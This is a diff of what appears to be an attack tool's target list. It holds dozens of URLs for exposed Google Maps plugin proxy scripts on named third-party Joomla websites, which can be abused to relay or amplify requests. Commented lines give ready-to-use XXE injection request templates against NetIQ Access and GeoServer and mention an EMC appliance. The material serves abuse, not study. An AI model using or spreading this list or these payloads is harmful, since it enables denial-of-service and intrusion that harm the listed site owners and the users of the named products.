@@ -52,8 +52,8 @@ http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.bergenpol.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.arantzabelaikastola.com/webgunea/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
@@ -69,12 +69,7 @@ http://es.laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_pro
 http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=
 http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=
-http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
-http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
-http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
-http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=
 http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=
@@ -150,7 +145,7 @@ http://www.limitless-coiffure.com/plugins/system/plugin_googlemap2_proxy.php?url
 http://finnrelax.hu/fitnesz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://hotelsixty3.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://screenshot.com.ua/makeit.cgi;POST;about42.nl.txt
-http://www.dimensionebimbi.it/DB//plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.dimensionebimbi.it/DB/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.molineroava.com/en/plugins/system/plugin_googlemap2_proxy.php?url=
 http://adeptlock.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://voda.dn.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
@@ -159,9 +154,16 @@ http://voda.dn.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?u
 # XXE Injection in NetIQ Access:
 # https://site:8443/nps/servlet/webacc?taskId=fw.PreviewObjectFilter&nextState=initialState&merge=fw.TCPreviewFilter&query=<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><query><container>%26xxe%3b</container><subclasses>false</subclasses></query>
 # XXE Injection in GeoServer: Take value of !C! from http://site/wfs?request=GetCapabilities
-# http://site/wfs?request=GetFeature&service=WFS&version=1.0.0&typename=!C!&FILTER=<?xml+version="1.0"+encoding="ISO-8859-1"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><Filter ><PropertyIsEqualTo><PropertyName>&xxe;</PropertyName><Literal>Brussels</Literal></PropertyIsEqualTo></Filter>
+# http://site/wfs?request=GetFeature&service=WFS&version=1.0.0&typename=!C!&FILTER=<?xml+version="1.0"+encoding="ISO-8859-1"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><Filter><PropertyIsEqualTo><PropertyName>&xxe;</PropertyName><Literal>Brussels</Literal></PropertyIsEqualTo></Filter>
 http://www.theatredebelleville.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://cnnp.if.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://loretta-altabadia.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://trolebus.gob.ec/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://www.polarissupreme.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+# XXE Injection in EMC Cloud Tiering Appliance
+# http://site/api/login;XML;EMC.txt
+http://proxy2974.my-addr.org/myaddrproxy.php/
+http://dacd.win/b.php?b=4&u=
+http://www.ecocenter-vg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
+http://econom.govvrn.ru/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.sandp.co.th/plugins/system/plugin_googlemap2_proxy.php?url=
